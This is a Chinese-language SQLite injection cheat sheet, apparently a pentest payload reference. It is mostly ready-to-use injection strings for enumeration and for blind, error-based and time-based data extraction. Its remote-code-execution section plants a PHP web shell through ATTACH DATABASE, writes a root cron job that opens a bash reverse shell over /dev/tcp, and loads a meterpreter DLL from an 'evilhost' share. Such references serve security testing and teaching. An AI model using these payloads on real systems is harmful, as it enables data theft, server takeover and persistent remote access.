# SQLite 注入

> SQLite 注入是一种安全漏洞，当攻击者可以将恶意的 SQL 代码插入或“注入”到由 SQLite 数据库执行的 SQL 查询中时，就会发生这种漏洞。当用户输入未经适当的清理或参数化就集成到 SQL 语句中时，就会产生此漏洞，从而允许攻击者操纵查询逻辑。此类注入可能导致未经授权的数据访问、数据操纵和其他严重的安全问题。

## 摘要

* [SQLite 注释](#sqlite-comments)
* [SQLite 枚举](#sqlite-enumeration)
* [SQLite 字符串](#sqlite-string)
    * [SQLite 字符串方法](#sqlite-string-methodology)
* [SQLite 盲注](#sqlite-blind)
    * [SQLite 盲注方法](#sqlite-blind-methodology)
    * [使用子串等效的 SQLite 盲注](#sqlite-blind-with-substring-equivalent)
* [SQLite 基于报错](#sqlite-error-based)
* [SQLite 基于时间](#sqlite-time-based)
* [SQLite 远程代码执行](#sqlite-remote-code-execution)
    * [附加数据库 (Attach Database)](#attach-database)
    * [加载扩展 (Load_extension)](#load_extension)
* [SQLite 文件操作](#sqlite-file-manipulation)
    * [SQLite 读取文件](#sqlite-read-file)
    * [SQLite 写入文件](#sqlite-write-file)
* [参考资料](#references)

## SQLite 注释

| 描述 | 注释 |
| ------------------- | ------- |
| 单行注释 | `--`    |
| 多行注释  | `/**/`  |

## SQLite 枚举

| 描述   | SQL 查询 |
| ------------- | ----------------------------------------- |
| DBMS 版本  | `select sqlite_version();`                |

## SQLite 字符串

### SQLite 字符串方法

| 描述             | SQL 查询                                 |
| ----------------------- | ----------------------------------------- |
| 提取数据库结构                           | `SELECT sql FROM sqlite_schema` |
| 提取数据库结构 (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
| 提取表名  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
| 提取表名  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
| 提取列名 | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
| 提取列名 | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
| 提取列名 | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
| 提取列名 | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |

## SQLite 盲注

### SQLite 盲注方法

| 描述             | SQL 查询                                 |
| ----------------------- | ----------------------------------------- |
| 计算表的数量  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
| 枚举表名  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
| 提取信息            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
| 提取信息 (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |

### 使用子串等效的 SQLite 盲注

| 函数    | 示例                                   |
| ----------- | ----------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |

## SQLite 基于报错

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## SQLite 基于时间

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## SQLite 远程代码执行

### 附加数据库 (Attach Database)

此代码片段展示了攻击者如何滥用 SQLite 的 `ATTACH DATABASE` 功能在服务器上植入 Web Shell：

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

首先，它告诉 SQLite 将 PHP 文件“视为”可写的 SQLite 数据库。然后它在该文件中创建一个表（实际上这就是未来的 Web Shell）。最后，它将恶意的 PHP 代码写入该文件。

**注意：** 使用 `ATTACH DATABASE` 创建文件有一个缺点：SQLite 会在其前面添加它的魔术头字节（`5351 4c69 7465 2066 6f72 6d61 7420 3300`，即 *“SQLite format 3”*）。这些字节会损坏大多数服务器端脚本，但 PHP 异常宽容：只要 `<?php` 标签出现在文件中的任何位置，解释器就会忽略前面的任何垃圾数据并执行嵌入的代码。

```ps1
file shell.php  
shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

如果无法上传 PHP Web Shell，但该服务以 root 权限运行，攻击者可以使用相同的技术创建一个触发反向 Shell 的 cron 任务：

```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
```

这会写入一个新的 cron 条目，该条目每分钟运行一次并连回攻击者。

### 加载扩展 (Load_extension)

:warning: 在大多数环境中，SQLite 加载外部共享库（扩展）的功能默认是禁用的。启用后，SQLite 可以使用 `load_extension()` SQL 函数加载已编译的模块：

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

在 sqlite3 命令行 shell 中，您可以使用以下命令显示运行时配置：

```sql
sqlite> .dbconfig
    load_extension on
```

如果您看到 `load_extension on`（或 off），这表明 shell 的运行时当前是否允许加载共享库扩展。

SQLite 扩展只是一个原生的共享库，通常是 Linux 上的 `.so` 文件或 Windows 上的 `.dll` 文件，它暴露了一个特殊的初始化函数。加载扩展时，SQLite 会调用此函数来注册该模块提供的任何新 SQL 函数、虚拟表或其他功能。

要在 Linux 上编译可加载的扩展，您可以使用：

```ps1
gcc -g -fPIC -shared demo.c -o demo.so
```

## SQLite 文件操作

### SQLite 读取文件

SQLite 默认不支持文件 I/O 操作。

### SQLite 写入文件

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```

